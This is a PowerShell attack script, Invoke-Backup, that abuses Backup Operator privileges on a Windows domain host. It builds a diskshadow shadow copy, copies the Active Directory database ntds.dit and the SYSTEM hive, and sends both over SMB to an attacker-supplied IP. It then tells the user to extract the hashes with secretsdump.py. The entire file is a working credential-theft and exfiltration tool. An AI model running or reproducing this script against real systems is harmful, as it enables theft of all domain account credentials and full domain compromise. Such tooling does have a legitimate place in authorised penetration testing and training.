Function Invoke-Backup
{
	<# The following script is to be ran if a user is a Backup Operator. Remember you will need to copy system.bak and ntds.dit to your
	attacker machine, the following script will try and do it for you, but you will need to set up your own smbserver with the following
	smbserver.py -smb2support share .
	
	More information on how to use this script can be found here https://overgrowncarrot1.medium.com/invoke-backup-ps1-3748f7677b2e
	
	#>

	[cmdletbinding()] Param(
        
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $AttackerIP
    )
    if ($AttackerIP)
    {

		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Writing Script"

    cd C:\Windows\Temp;

echo "set verbose on" > script.txt
echo "set metadata C:\Windows\Temp\meta.cab" >> script.txt 
echo "set context clientaccessible" >> script.txt 
echo "set context persistent" >> script.txt 
echo "begin backup" >> script.txt 
echo "add volume C: alias cdrive" >> script.txt 
echo "create" >> script.txt 
echo "expose %cdrive% E:" >> script.txt 
echo "end backup" >> script.txt
    
    	write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running Disk Shadow"

      cd C:\Windows\Temp;

 			diskshadow /s script.txt
		
 		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running Robocopy for ntds.dit"

 			robocopy /b E:\Windows\ntds . ntds.dit

 		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Saving system.bak"

 			reg save hklm\system C:\Windows\Temp\system.bak

 		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Copying ntds.dit and system.bak to $AttackerIP, Please ensure you have an SMB Server running"
 		
$confirmation = Read-Host "Confirm SMB Server has been started on $AttackerIP (Y/N):"
if ($confirmation -eq 'y') 
  {
      write-host -foregroundcolor green -backgroundcolor black "`n`n[*] You have confirmed to continue"

 			cp C:\Windows\Temp\system.bak \\$AttackerIP\share

			cp C:\Windows\Temp\ntds.dit \\$AttackerIP\share	

		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] On attacker machine run the following secretsdump.py -system system.bak -ntds ntds.dit local, remember this is if impacket has been exported, if not will need full file path"
    
    write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Thanks for using Invoke-Backup.ps1"
    
    }
    else
    {

    		'Something Went Wrong, Could Not Complete'

    }
  }
}
